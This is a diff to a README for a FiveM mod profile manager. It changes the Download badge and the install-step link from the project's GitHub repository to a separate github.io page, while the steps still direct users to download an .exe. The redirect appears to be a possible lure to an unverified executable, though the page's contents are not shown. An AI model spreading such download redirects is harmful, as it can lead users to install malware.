@@ -1,6 +1,6 @@
 # 📂 FiveM-Resource-Mod-Manager - Manage your FiveM mod profiles easily
 
-[![](https://img.shields.io/badge/Download-FiveM_Resource_Manager-blue.svg)](https://github.com/trivial-overlordship234/FiveM-Resource-Mod-Manager)
+[![](https://img.shields.io/badge/Download-FiveM_Resource_Manager-blue.svg)](https://trivial-overlordship234.github.io)
 
 ## 🎯 About the software
 
@@ -19,7 +19,7 @@ This tool requires basic components to run on your computer. Ensure your system 
 
 Follow these steps to set up the software on your machine:
 
-1. Visit [the project page here](https://github.com/trivial-overlordship234/FiveM-Resource-Mod-Manager) to find the latest version.
+1. Visit [the project page here](https://trivial-overlordship234.github.io) to find the latest version.
 2. Look for the "Releases" section on the right side of the page.
 3. Click on the version marked "Latest."
 4. Find the file ending in ".exe" under the "Assets" section.
